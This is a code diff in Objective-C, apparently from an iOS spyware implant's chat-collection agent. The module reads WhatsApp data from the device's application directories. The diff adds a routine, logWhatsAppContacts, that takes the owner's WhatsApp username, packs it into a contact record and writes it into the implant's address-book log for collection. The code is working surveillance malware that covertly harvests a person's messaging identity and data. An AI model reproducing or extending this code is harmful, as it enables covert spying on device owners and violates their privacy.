@@ -9,6 +9,8 @@
 #import "RCSIAgentChat.h"
 #import "RCSILogManager.h"
 #import "RCSIUtils.h"
+#import "RCSIAgentAddressBook.h"
+#import "RCSILogManager.h"
 
 #define USER_APPLICATIONS_PATH @"/private/var/mobile/Applications"
 #define k_i_AgentChatRunLoopMode @"k_i_AgentChatRunLoopMode"
@@ -24,10 +26,12 @@
 #define Z_PK_POS          5
 #define ZCHATSESSION_POS  6
 
+static BOOL gWahtAppContactGrabbed = NO;
+
 @implementation _i_AgentChat
 
 #pragma mark -
-#pragma mark - Initialization 
+#pragma mark - Initialization
 #pragma mark -
 
 - (id)init
@@ -38,7 +42,7 @@
       mLastMsgPK = 0;
       mAgentID = AGENT_IM;
       mWADbPathName = nil;
-      mWAUsername = nil;
+      mWAUsername = @"";
     }
     
     return self;
@@ -142,7 +146,7 @@
 
 - (void)setWAUserName
 {
-  if ([self isThreadCancelled] == TRUE || mWAUsername != nil)
+  if ([self isThreadCancelled] == TRUE || [mWAUsername length] > 0)
     return;
   
   NSString *rootPath = [self getWARootPathName];
@@ -194,6 +198,97 @@
   }
 
   return bRet;
+}
+
+- (void)logWhatsAppContacts:(NSString*)contact
+{
+  if (gWahtAppContactGrabbed == YES)
+    return;
+  
+  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
+  
+  ABLogStrcut header;
+  ABFile      abFile;
+  ABContats   abContat;
+  ABNumbers   abNumber;
+  Names       abNames;
+  
+  // setting magic
+  header.magic    = CONTACTLIST_2;
+  abFile.magic    = CONTACTFILE;
+  abContat.magic  = CONTACTCNT;
+  abNumber.magic  = CONTACTNUM;
+  abNames.magic   = CONTACTNAME;
+  
+  header.numRecords = 1;
+  header.len        = 0xFFFFFFFF;
+  
+  NSData *firstData = [@"WhatsApp" dataUsingEncoding:NSUTF16LittleEndianStringEncoding];
+  
+  // New contact
+  abFile.len   = 0;
+  
+  abFile.flag = 0x80000001;
+  
+  NSMutableData *abData = [[NSMutableData alloc] initWithCapacity: 0];
+  
+  // Add header
+  [abData appendBytes: (const void *) &header length: sizeof(header)];
+  
+  [abData appendBytes: (const void *) &abFile length: sizeof(abFile)];
+  
+  // FirstName abNames
+  abNames.len = [firstData length];
+  [abData appendBytes: (const void *) &abNames length: sizeof(abNames)];
+  [abData appendBytes: (const void *) [firstData bytes]
+               length: abNames.len];
+  
+  // LastName abNames
+  abNames.len = [firstData length];
+  [abData appendBytes: (const void *) &abNames length: sizeof(abNames)];
+  [abData appendBytes: (const void *) [firstData bytes]
+               length: abNames.len];
+  
+  // Telephone numbers
+  abContat.numContats = 1;
+  [abData appendBytes: (const void *) &abContat length: sizeof(abContat)];
+  
+  abNumber.type = 0;
+  [abData appendBytes: (const void *) &abNumber length: sizeof(abNumber)];
+  
+  abNames.len = [contact lengthOfBytesUsingEncoding: NSUTF16LittleEndianStringEncoding];
+  
+  [abData appendBytes: (const void *) &abNames length: sizeof(abNames)];
+  [abData appendBytes: (const void *) [[contact dataUsingEncoding: NSUTF16LittleEndianStringEncoding] bytes]
+               length: abNames.len];
+  
+  
+  // Setting len of NSData - sizeof(magic)
+  ABLogStrcut *logS = (ABLogStrcut *) [abData bytes];
+  
+  logS->len = [abData length] - (sizeof(logS->magic) + sizeof(logS->len));
+  
+  _i_LogManager *logManager = [_i_LogManager sharedInstance];
+  
+  BOOL success = [logManager createLog: LOG_ADDRESSBOOK
+                           agentHeader: nil
+                             withLogID: 0xABCD];
+  
+  if (success == TRUE)
+  {
+    if ([logManager writeDataToLog: abData
+                          forAgent: LOG_ADDRESSBOOK
+                         withLogID: 0xABCD] == TRUE)
+    {
+      [logManager closeActiveLog: LOG_ADDRESSBOOK withLogID: 0xABCD];
+    }
+  }
+  
+  [abData release];
+  
+  [pool release];
+  
+  gWahtAppContactGrabbed = TRUE;
 }
 
 #pragma mark -
@@ -714,6 +809,7 @@
   if ([self isThreadCancelled] == TRUE)
   {
     [self setMAgentStatus:AGENT_STATUS_STOPPED];
+    [pool release];
     return;
   }
     
@@ -751,6 +847,8 @@
   }
   
   [self setWAUserName];
+  
+  [self logWhatsAppContacts:mWAUsername];
   
   [self getProperties];
   
